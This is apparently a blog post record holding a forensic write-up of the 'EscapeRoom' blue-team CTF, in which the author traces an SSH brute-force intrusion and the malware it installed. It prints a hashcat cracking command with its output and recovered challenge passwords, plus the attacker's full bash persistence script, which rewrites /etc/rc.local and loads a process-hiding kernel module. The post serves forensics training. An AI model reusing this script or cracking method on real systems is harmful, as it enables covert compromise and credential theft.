9\n:::\n\n> 17- What are the commands that the malware was receiving from attacker servers? Format: comma-separated in alphabetical order\n\nAfter spending time on thinking and searching. We get the idea ! \nThe malware will get message form attacker servers! So let's check some functions call that related to something like messaging ! You'll find these functions in main !\n\n![](https://imgur.com/V4JQttO.png)\n\nThe function check if the parameter has these 2 values ! I want to check it \n\n![](https://imgur.com/KSxTPRa.png)\n\nAfter using python to convert the numbers to text using long_to_bytes function i found that 2 values are instruction in the assembly , Bingo we get it ! \n\n![](https://imgur.com/Hz6LsfB.png)\n\n:::success\nAnswer: nop,run\n:::","source":"_posts/CyberDefenders/EscapeRoom.md","raw":"---\ntitle: CyberDefenders Writeup EscapeRoom\ndate: 2022-09-07 16:28:39\ntags:\ncover: https://cyberdefenders.org/media/terraform/EscapeRoom/escaperoom_fcW8Hvp.png\ncategories:\n- [CyberDefenders]\n---\n\nThis CTF challenge is made by The Honeynet Project organization. This challenge is a combination of several entry to intermediate-level tasks of increasing difficulty focusing on authentication, information hiding, and cryptography.\n\n# Challenge Information \n\n\n+++info Description\n\nYou belong to a company specializing in hosting web applications through KVM-based Virtual Machines. Over the weekend, one VM went down, and the site administrators fear this might be the result of malicious activity. They extracted a few logs from the environment in hopes that you might be able to determine what happened.\n\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/18\n  desc: CyberDefenders - EscapeRoom \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - The Honeynet Project\n  desc: The Honeynet Project Twitter Profile\n  url: https://twitter.com/ProjectHoneynet\n  image: https://pbs.twimg.com/profile_images/582417177254334464/BNceiZYA_400x400.png\n  color: \"#fcc11c\"\n\n{% endlinks %}\n\n# Walkthrough\n\nWe start analyzing the pcap file, i open it with Brim Security and checking the alerts!! Oh god! A lot of ssh flows! mmm I guess the attacker try to gain access through the ssh service, he did a bruteforce attack ! \n![](https://imgur.com/cXk82fL.png)\n\n> 1- What service did the attacker use to gain access to the system?\n\nThe attacker use ssh protocol to gain access to the system ! \n\n:::success\nAnswer: ssh\n:::\n\n> 2- What attack type was used to gain access to the system?(one word)\n\nWe found a lot of ssh packets! I am sure this is a bruteforce attack \n\n:::success\nAnswer: bruteforce\n:::\n\n\n> 3- What was the tool the attacker possibly used to perform this attack?\n\nOne of the most famous tools that can do this type of attack is hydra\nHydra is an amazing tool for testing the strength of your SSH security. It is capable of running through massive lists of usernames, passwords, and targets to test if you or a user is using a potentially vulnerable password.\n\n:::success\nAnswer: Hydra\n:::\n\n> 4- How many failed attempts were there?\n\nLet's inspect the alert events in Brim Security and apply the count() by feature in the `alert.signature`. We found 53 `NetSSH Hardcoded in Metasploit`. We decrease by 1 the success one!\n![](https://imgur.com/DpgkZjt.png)\n\n:::success\nAnswer: 52\n:::\n\nWe have the hashes of the passwords! We know that the hashes are SHA-512(UNIX). The black cat (oh means hashcat) will help us cracking these hashes!\nٍ![](https://imgur.com/DN0qNUF.png)\n\n```bash command line prompt\nhashcat -a 0 -m 1800 shadow.log rockyou.txt\n\nSession..........: hashcat\nStatus...........: Running\nHash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))\nHash.Target......: crack.txt\nTime.Started.....: Wed Sep  7 23:58:23 2022 (43 mins, 15 secs)\nTime.Estimated...: Fri Sep  9 04:15:48 2022 (1 day, 3 hours)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/mnt/c/Users/Mohamed Rafraf/Desktop/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.1.........:      986 H/s (5.30ms) @ Accel:32 Loops:1024 Thr:1 Vec:4\nRecovered........: 3/10 (30.00%) Digests, 3/10 (30.00%) Salts\nProgress.........: 3579360/143443840 (2.50%)\nRejected.........: 0/3579360 (0.00%)\nRestore.Point....: 357920/14344384 (2.50%)\nRestore.Sub.1...: Salt:5 Amplifier:0-1 Iteration:4096-5000\nCandidate.Engine.: Device Generator\nCandidates.1....: donjoe -> dominique12\n\n[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>\n\n```\n\n\n> 5- What credentials (username:password) were used to gain access? Refer to shadow.log and sudoers.log.\n\nJust wait for hashcat man!\n\n:::success\nmanager:forgot\n:::\n\n> 6- What other credentials (username:password) could have been used to gain access also have SUDO privileges? Refer to shadow.log and sudoers.log.\n\nHashcat will save you for sure ! \n\n:::success\nsean:spectre\n:::\n\n> 7- What is the tool used to download malicious files on the system?\n\nLet's check the `user-agent` in brim security. you can do it with wireshark too!\n![](https://imgur.com/P9haLBY.png)\n\n:::success\nAnswer: wget\n:::\n\n> 8- How many files the attacker download to perform malware installation?\n\nChecking the non-media files in brim security will help us to know about the files\n\n![](https://imgur.com/P6St7uU.png)\n\n:::success\nAnswer: 3\n:::\n\n> 9- What is the main malware MD5 hash?\n\nThe malware is an executable file for sure! let's check it \n\n![](https://imgur.com/VN12PmD.png)\n\nOpen the details about it and you'll get the md5sum ! \n\n![](https://imgur.com/YgnR9gz.png)\n\n:::success\nAnswer: 772b620736b760c1d736b1e6ba2f885b\n:::\n\nWe found this bash script that rename the malware mail and hide it in /var/mail/ directory and make it executable at the startup!\n\n```bash command line prompt \n#!/bin/bash\n\nmv 1 /var/mail/mail\nchmod +x /var/mail/mail\necho -e \"/var/mail/mail &\\nsleep 1\\npidof mail > /proc/dmesg\\nexit 0\" > /etc/rc.local\nnohup /var/mail/mail > /dev/null 2>&1&\nmv 2 /lib/modules/`uname -r`/sysmod.ko\ndepmod -a\necho \"sysmod\" >> /etc/modules\nmodprobe sysmod\nsleep 1\npidof mail > /proc/dmesg\nrm 3\n```\n\n> 10- What file has the script modified so the malware will start upon reboot?\n\nThe script /etc/rc.local is for use by the system administrator. It is traditionally executed after all the normal system services are started\n\n:::success\nAnswer: /etc/rc.local\n:::\n\n\n> 11- Where did the malware keep local files?\n:::success\n /var/mail/\n:::\n\n> 12- What is missing from ps.log?\n\nIn the ps.log we don't find the process related to the malware (the mail executable)\n\n:::success\n /var/mail/mail\n:::\n\n> 13- What is the main file that used to remove this information from ps.log?\n\nThere is another binary that moved and renamed as `sysmod.ko`\n\n:::success\nAnswer: sysmod.ko\n:::\n\n> 14- Inside the Main function, what is the function that causes requests to those servers?\n\nAfter unpacking the malware. I opened the binary with IDA Pro to decompile it. Check the main function and we found this ! \n\n![](https://imgur.com/79houmJ.png)\n:::success\nAnswer: requestFile\n:::\n\n> 15- One of the IP's the malware contacted starts with 17. Provide the full IP.\n\nrequestFile function use address array as parameters. let's check it ! we found all the IP address. COOL ! \n\n![](https://imgur.com/4NLcX9k.png)\n\n:::success\nAnswer: 174.129.57.253\n:::\n\n> 16- How many files the malware requested from external servers?\n\nThis is easy man ! just check the other downloaded files ! \n\n![](https://imgur.com/hjMszwa.png)\n\n:::success\nAnswer: 9\n:::\n\n> 17- What are the commands that the malware was receiving from attacker servers? Format: comma-separated in alphabetical order\n\nAfter spending time on thinking and searching. We get the idea ! \nThe malware will get message form attacker servers! So let's check some functions call that related to something like messaging ! You'll find these functions in main !\n\n![](https://imgur.com/V4JQttO.png)\n\nThe function check if the parameter has these 2 values ! I want to check it \n\n![](https://imgur.com/KSxTPRa.png)\n\nAfter using python to convert the numbers to text using long_to_bytes function i found that 2 values are instruction in the assembly , Bingo we get it ! \n\n![](https://imgur.com/Hz6LsfB.png)\n\n:::success\nAnswer: nop,run\n:::","slug":"CyberDefenders/EscapeRoom","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxn60004d5qfgz9yavq2","content":"<p>This CTF challenge is made by The Honeynet Project organization. This challenge is a combination of several entry to intermediate-level tasks of increasing difficulty focusing on authentication, information hiding, and cryptography.</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>You belong to a company specializing in hosting web applications through KVM-based Virtual Machines. Over the weekend, one VM went down, and the site administrators fear this might be the result of malicious activity. They extracted a few logs from the environment in hopes that you might be able to determine what happened.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - EscapeRoom</p>\n          </div></div><div class=\"item\" title=\"Author - The Honeynet Project\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=\" data-background-image=\"https://pbs.twimg.com/profile_images/582417177254334464/BNceiZYA_400x400.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=\">Author - The Honeynet Project</span>\n          <p class=\"desc\">The Honeynet Project Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>We start analyzing the pcap file, i open it with Brim Security and checking the alerts!! Oh god! A lot of ssh flows! mmm I guess the attacker try to gain access through the ssh service, he did a bruteforce attack !<br>\n<img data-src=\"https://imgur.com/cXk82fL.png\" alt=\"\"></p>\n<blockquote>\n<p>1- What service did the attacker use to gain access to the system?</p>\n</blockquote>\n<p>The attacker use ssh protocol to gain access to the system !</p>\n<div class=\"note success\">\n<p>Answer: ssh</p>\n</div>\n<blockquote>\n<p>2- What attack type was used to gain access to the system?(one word)</p>\n</blockquote>\n<p>We found a lot of ssh packets! I am sure this is a bruteforce attack</p>\n<div class=\"note success\">\n<p>Answer: bruteforce</p>\n</div>\n<blockquote>\n<p>3- What was the tool the attacker possibly used to perform this attack?</p>\n</blockquote>\n<p>One of the most famous tools that can do this type of attack is hydra<br>\nHydra is an amazing tool for testing the strength of your SSH security. It is capable of running through massive lists of usernames, passwords, and targets to test if you or a user is using a potentially vulnerable password.</p>\n<div class=\"note success\">\n<p>Answer: Hydra</p>\n</div>\n<blockquote>\n<p>4- How many failed attempts were there?</p>\n</blockquote>\n<p>Let’s inspect the alert events in Brim Security and apply the count() by feature in the  <code>alert.signature</code> . We found 53  <code>NetSSH Hardcoded in Metasploit</code> . We decrease by 1 the success one!<br>\n<img data-src=\"https://imgur.com/DpgkZjt.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 52</p>\n</div>\n<p>We have the hashes of the passwords! We know that the hashes are SHA-512(UNIX). The black cat (oh means hashcat) will help us cracking these hashes!<br>\nٍ<img data-src=\"https://imgur.com/DN0qNUF.png\" alt=\"\"></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat -a 0 -m 1800 shadow.log rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Running</span><br><span class=\"line\">Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))</span><br><span class=\"line\">Hash.Target......: crack.txt</span><br><span class=\"line\">Time.Started.....: Wed Sep  7 23:58:23 2022 (43 mins, 15 secs)</span><br><span class=\"line\">Time.Estimated...: Fri Sep  9 04:15:48 2022 (1 day, 3 hours)</span><br><span class=\"line\">Kernel.Feature...: Pure Kernel</span><br><span class=\"line\">Guess.Base.......: File (/mnt/c/Users/Mohamed Rafraf/Desktop/rockyou.txt)</span><br><span class=\"line\">Guess.Queue......: 1/1 (100.00%)</span><br><span class=\"line\">Speed.1.........:      986 H/s (5.30ms) @ Accel:32 Loops:1024 Thr:1 Vec:4</span><br><span class=\"line\">Recovered........: 3/10 (30.00%) Digests, 3/10 (30.00%) Salts</span><br><span class=\"line\">Progress.........: 3579360/143443840 (2.50%)</span><br><span class=\"line\">Rejected.........: 0/3579360 (0.00%)</span><br><span class=\"line\">Restore.Point....: 357920/14344384 (2.50%)</span><br><span class=\"line\">Restore.Sub.1...: Salt:5 Amplifier:0-1 Iteration:4096-5000</span><br><span class=\"line\">Candidate.Engine.: Device Generator</span><br><span class=\"line\">Candidates.1....: donjoe -&gt; dominique12</span><br><span class=\"line\"></span><br><span class=\"line\">[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>5- What credentials (username:password) were used to gain access? Refer to shadow.log and sudoers.log.</p>\n</blockquote>\n<p>Just wait for hashcat man!</p>\n<div class=\"note success\">\n<p>manager:forgot</p>\n</div>\n<blockquote>\n<p>6- What other credentials (username:password) could have been used to gain access also have SUDO privileges? Refer to shadow.log and sudoers.log.</p>\n</blockquote>\n<p>Hashcat will save you for sure !</p>\n<div class=\"note success\">\n<p>sean:spectre</p>\n</div>\n<blockquote>\n<p>7- What is the tool used to download malicious files on the system?</p>\n</blockquote>\n<p>Let’s check the  <code>user-agent</code>  in brim security. you can do it with wireshark too!<br>\n<img data-src=\"https://imgur.com/P9haLBY.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: wget</p>\n</div>\n<blockquote>\n<p>8- How many files the attacker download to perform malware installation?</p>\n</blockquote>\n<p>Checking the non-media files in brim security will help us to know about the files</p>\n<p><img data-src=\"https://imgur.com/P6St7uU.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 3</p>\n</div>\n<blockquote>\n<p>9- What is the main malware MD5 hash?</p>\n</blockquote>\n<p>The malware is an executable file for sure! let’s check it</p>\n<p><img data-src=\"https://imgur.com/VN12PmD.png\" alt=\"\"></p>\n<p>Open the details about it and you’ll get the md5sum !</p>\n<p><img data-src=\"https://imgur.com/YgnR9gz.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 772b620736b760c1d736b1e6ba2f885b</p>\n</div>\n<p>We found this bash script that rename the malware mail and hide it in /var/mail/ directory and make it executable at the startup!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mv</span> 1 /var/mail/mail</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x /var/mail/mail</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;/var/mail/mail &amp;\\nsleep 1\\npidof mail &gt; /proc/dmesg\\nexit 0&quot;</span> &gt; /etc/rc.local</span><br><span class=\"line\"><span class=\"built_in\">nohup</span> /var/mail/mail &gt; /dev/null 2&gt;&amp;1&amp;</span><br><span class=\"line\"><span class=\"built_in\">mv</span> 2 /lib/modules/`<span class=\"built_in\">uname</span> -r`/sysmod.ko</span><br><span class=\"line\">depmod -a</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;sysmod&quot;</span> &gt;&gt; /etc/modules</span><br><span class=\"line\">modprobe sysmod</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\">pidof mail &gt; /proc/dmesg</span><br><span class=\"line\"><span class=\"built_in\">rm</span> 3</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>10- What file has the script modified so the malware will start upon reboot?</p>\n</blockquote>\n<p>The script /etc/rc.local is for use by the system administrator. It is traditionally executed after all the normal system services are started</p>\n<div class=\"note success\">\n<p>Answer: /etc/rc.local</p>\n</div>\n<blockquote>\n<p>11- Where did the malware keep local files?</p>\n</blockquote>\n<div class=\"note success\">\n<p>/var/mail/</p>\n</div>\n<blockquote>\n<p>12- What is missing from ps.log?</p>\n</blockquote>\n<p>In the ps.log we don’t find the process related to the malware (the mail executable)</p>\n<div class=\"note success\">\n<p>/var/mail/mail</p>\n</div>\n<blockquote>\n<p>13- What is the main file that used to remove this information from ps.log?</p>\n</blockquote>\n<p>There is another binary that moved and renamed as  <code>sysmod.ko</code></p>\n<div class=\"note success\">\n<p>Answer: sysmod.ko</p>\n</div>\n<blockquote>\n<p>14- Inside the Main function, what is the function that causes requests to those servers?</p>\n</blockquote>\n<p>After unpacking the malware. I opened the binary with IDA Pro to decompile it. Check the main function and we found this !</p>\n<p><img data-src=\"https://imgur.com/79houmJ.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: requestFile</p>\n</div>\n<blockquote>\n<p>15- One of the IP’s the malware contacted starts with 17. Provide the full IP.</p>\n</blockquote>\n<p>requestFile function use address array as parameters. let’s check it ! we found all the IP address. COOL !</p>\n<p><img data-src=\"https://imgur.com/4NLcX9k.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 174.129.57.253</p>\n</div>\n<blockquote>\n<p>16- How many files the malware requested from external servers?</p>\n</blockquote>\n<p>This is easy man ! just check the other downloaded files !</p>\n<p><img data-src=\"https://imgur.com/hjMszwa.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 9</p>\n</div>\n<blockquote>\n<p>17- What are the commands that the malware was receiving from attacker servers? Format: comma-separated in alphabetical order</p>\n</blockquote>\n<p>After spending time on thinking and searching. We get the idea !<br>\nThe malware will get message form attacker servers! So let’s check some functions call that related to something like messaging ! You’ll find these functions in main !</p>\n<p><img data-src=\"https://imgur.com/V4JQttO.png\" alt=\"\"></p>\n<p>The function check if the parameter has these 2 values ! I want to check it</p>\n<p><img data-src=\"https://imgur.com/KSxTPRa.png\" alt=\"\"></p>\n<p>After using python to convert the numbers to text using long_to_bytes function i found that 2 values are instruction in the assembly , Bingo we get it !</p>\n<p><img data-src=\"https://imgur.com/Hz6LsfB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: nop,run</p>\n</div>\n","site":{"data":{}},"length":5185,"excerpt":"","more":"<p>This CTF challenge is made by The Honeynet Project organization. This challenge is a combination of several entry to intermediate-level tasks of increasing difficulty focusing on authentication, information hiding, and cryptography.</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>You belong to a company specializing in hosting web applications through KVM-based Virtual Machines. Over the weekend, one VM went down, and the site administrators fear this might be the result of malicious activity. They extracted a few logs from the environment in hopes that you might be able to determine what happened.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - EscapeRoom</p>\n          </div></div><div class=\"item\" title=\"Author - The Honeynet Project\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=\" data-background-image=\"https://pbs.twimg.com/profile_images/582417177254334464/BNceiZYA_400x400.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=\">Author - The Honeynet Project</span>\n          <p class=\"desc\">The Honeynet Project Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>We start analyzing the pcap file, i open it with Brim Security and checking the alerts!! Oh god! A lot of ssh flows! mmm I guess the attacker try to gain access through the ssh service, he did a bruteforce attack !<br>\n<img data-src=\"https://imgur.com/cXk82fL.png\" alt=\"\"></p>\n<blockquote>\n<p>1- What service did the attacker use to gain access to the system?</p>\n</blockquote>\n<p>The attacker use ssh protocol to gain access to the system !</p>\n<div class=\"note success\">\n<p>Answer: ssh</p>\n</div>\n<blockquote>\n<p>2- What attack type was used to gain access to the system?(one word)</p>\n</blockquote>\n<p>We found a lot of ssh packets! I am sure this is a bruteforce attack</p>\n<div class=\"note success\">\n<p>Answer: bruteforce</p>\n</div>\n<blockquote>\n<p>3- What was the tool the attacker possibly used to perform this attack?</p>\n</blockquote>\n<p>One of the most famous tools that can do this type of attack is hydra<br>\nHydra is an amazing tool for testing the strength of your SSH security. It is capable of running through massive lists of usernames, passwords, and targets to test if you or a user is using a potentially vulnerable password.</p>\n<div class=\"note success\">\n<p>Answer: Hydra</p>\n</div>\n<blockquote>\n<p>4- How many failed attempts were there?</p>\n</blockquote>\n<p>Let’s inspect the alert events in Brim Security and apply the count() by feature in the  <code>alert.signature</code> . We found 53  <code>NetSSH Hardcoded in Metasploit</code> . We decrease by 1 the success one!<br>\n<img data-src=\"https://imgur.com/DpgkZjt.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 52</p>\n</div>\n<p>We have the hashes of the passwords! We know that the hashes are SHA-512(UNIX). The black cat (oh means hashcat) will help us cracking these hashes!<br>\nٍ<img data-src=\"https://imgur.com/DN0qNUF.png\" alt=\"\"></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat -a 0 -m 1800 shadow.log rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Running</span><br><span class=\"line\">Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))</span><br><span class=\"line\">Hash.Target......: crack.txt</span><br><span class=\"line\">Time.Started.....: Wed Sep  7 23:58:23 2022 (43 mins, 15 secs)</span><br><span class=\"line\">Time.Estimated...: Fri Sep  9 04:15:48 2022 (1 day, 3 hours)</span><br><span class=\"line\">Kernel.Feature...: Pure Kernel</span><br><span class=\"line\">Guess.Base.......: File (/mnt/c/Users/Mohamed Rafraf/Desktop/rockyou.txt)</span><br><span class=\"line\">Guess.Queue......: 1/1 (100.00%)</span><br><span class=\"line\">Speed.1.........:      986 H/s (5.30ms) @ Accel:32 Loops:1024 Thr:1 Vec:4</span><br><span class=\"line\">Recovered........: 3/10 (30.00%) Digests, 3/10 (30.00%) Salts</span><br><span class=\"line\">Progress.........: 3579360/143443840 (2.50%)</span><br><span class=\"line\">Rejected.........: 0/3579360 (0.00%)</span><br><span class=\"line\">Restore.Point....: 357920/14344384 (2.50%)</span><br><span class=\"line\">Restore.Sub.1...: Salt:5 Amplifier:0-1 Iteration:4096-5000</span><br><span class=\"line\">Candidate.Engine.: Device Generator</span><br><span class=\"line\">Candidates.1....: donjoe -&gt; dominique12</span><br><span class=\"line\"></span><br><span class=\"line\">[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>5- What credentials (username:password) were used to gain access? Refer to shadow.log and sudoers.log.</p>\n</blockquote>\n<p>Just wait for hashcat man!</p>\n<div class=\"note success\">\n<p>manager:forgot</p>\n</div>\n<blockquote>\n<p>6- What other credentials (username:password) could have been used to gain access also have SUDO privileges? Refer to shadow.log and sudoers.log.</p>\n</blockquote>\n<p>Hashcat will save you for sure !</p>\n<div class=\"note success\">\n<p>sean:spectre</p>\n</div>\n<blockquote>\n<p>7- What is the tool used to download malicious files on the system?</p>\n</blockquote>\n<p>Let’s check the  <code>user-agent</code>  in brim security. you can do it with wireshark too!<br>\n<img data-src=\"https://imgur.com/P9haLBY.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: wget</p>\n</div>\n<blockquote>\n<p>8- How many files the attacker download to perform malware installation?</p>\n</blockquote>\n<p>Checking the non-media files in brim security will help us to know about the files</p>\n<p><img data-src=\"https://imgur.com/P6St7uU.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 3</p>\n</div>\n<blockquote>\n<p>9- What is the main malware MD5 hash?</p>\n</blockquote>\n<p>The malware is an executable file for sure! let’s check it</p>\n<p><img data-src=\"https://imgur.com/VN12PmD.png\" alt=\"\"></p>\n<p>Open the details about it and you’ll get the md5sum !</p>\n<p><img data-src=\"https://imgur.com/YgnR9gz.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 772b620736b760c1d736b1e6ba2f885b</p>\n</div>\n<p>We found this bash script that rename the malware mail and hide it in /var/mail/ directory and make it executable at the startup!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mv</span> 1 /var/mail/mail</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x /var/mail/mail</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;/var/mail/mail &amp;\\nsleep 1\\npidof mail &gt; /proc/dmesg\\nexit 0&quot;</span> &gt; /etc/rc.local</span><br><span class=\"line\"><span class=\"built_in\">nohup</span> /var/mail/mail &gt; /dev/null 2&gt;&amp;1&amp;</span><br><span class=\"line\"><span class=\"built_in\">mv</span> 2 /lib/modules/`<span class=\"built_in\">uname</span> -r`/sysmod.ko</span><br><span class=\"line\">depmod -a</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;sysmod&quot;</span> &gt;&gt; /etc/modules</span><br><span class=\"line\">modprobe sysmod</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\">pidof mail &gt; /proc/dmesg</span><br><span class=\"line\"><span class=\"built_in\">rm</span> 3</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>10- What file has the script modified so the malware will start upon reboot?</p>\n</blockquote>\n<p>The script /etc/rc.local is for use by the system administrator. It is traditionally executed after all the normal system services are started</p>\n<div class=\"note success\">\n<p>Answer: /etc/rc.local</p>\n</div>\n<blockquote>\n<p>11- Where did the malware keep local files?</p>\n</blockquote>\n<div class=\"note success\">\n<p>/var/mail/</p>\n</div>\n<blockquote>\n<p>12- What is missing from ps.log?</p>\n</blockquote>\n<p>In the ps.log we don’t find the process related to the malware (the mail executable)</p>\n<div class=\"note success\">\n<p>/var/mail/mail</p>\n</div>\n<blockquote>\n<p>13- What is the main file that used to remove this information from ps.log?</p>\n</blockquote>\n<p>There is another binary that moved and renamed as  <code>sysmod.ko</code></p>\n<div class=\"note success\">\n<p>Answer: sysmod.ko</p>\n</div>\n<blockquote>\n<p>14- Inside the Main function, what is the function that causes requests to those servers?</p>\n</blockquote>\n<p>After unpacking the malware. I opened the binary with IDA Pro to decompile it. Check the main function and we found this !</p>\n<p><img data-src=\"https://imgur.com/79houmJ.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: requestFile</p>\n</div>\n<blockquote>\n<p>15- One of the IP’s the malware contacted starts with 17. Provide the full 